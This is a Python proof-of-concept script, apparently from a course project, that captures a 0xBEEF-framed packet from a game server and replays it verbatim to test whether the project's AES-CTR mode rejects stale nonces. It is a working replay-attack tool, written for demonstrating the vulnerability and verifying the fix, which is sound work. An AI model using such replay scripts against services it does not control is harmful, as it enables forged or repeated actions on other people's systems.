"""Simple replay-attack proof-of-concept for BEER packets.

Usage (run in two steps):

1. Record one valid framed packet while playing (e.g. with tcpdump or by
   running this script in --capture mode). A copy is saved to disk.
2. Run in --replay mode; it will reconnect to the server and resend the
   captured bytes verbatim. The secure (AES-CTR) mode when enabled should
   cause the server to reply with an ERROR / drop the frame because the
   nonce (seq) is stale.

This is *not* part of normal gameplay – it exists solely to meet Tier 4.4
rubric about vulnerability demonstration & fix verification.
"""

from __future__ import annotations

import argparse
import socket
import sys
from pathlib import Path

CAP_FILE = Path("replay_pkt.bin")


def capture(host: str, port: int) -> None:
    print("[EXPLOIT] Waiting to capture first framed packet…")
    with socket.create_connection((host, port)) as s:
        data = s.recv(1024)
        if data.startswith(b"\xBE\xEF"):
            CAP_FILE.write_bytes(data)
            print(f"[EXPLOIT] Saved {len(data)} bytes to {CAP_FILE}")
        else:
            print("[EXPLOIT] Did not receive framed packet – aborting")


def replay(host: str, port: int) -> None:
    if not CAP_FILE.exists():
        sys.exit("Capture file not found – run in --capture mode first")
    pkt = CAP_FILE.read_bytes()
    print(f"[EXPLOIT] Replaying {len(pkt)} bytes to server…")
    with socket.create_connection((host, port)) as s:
        s.sendall(pkt)
        resp = s.recv(256)
        print(f"[EXPLOIT] Server replied: {resp!r}")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=["capture", "replay"], required=True)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5000)
    args = parser.parse_args()

    if args.mode == "capture":
        capture(args.host, args.port)
    else:
        replay(args.host, args.port)


if __name__ == "__main__":
    main()
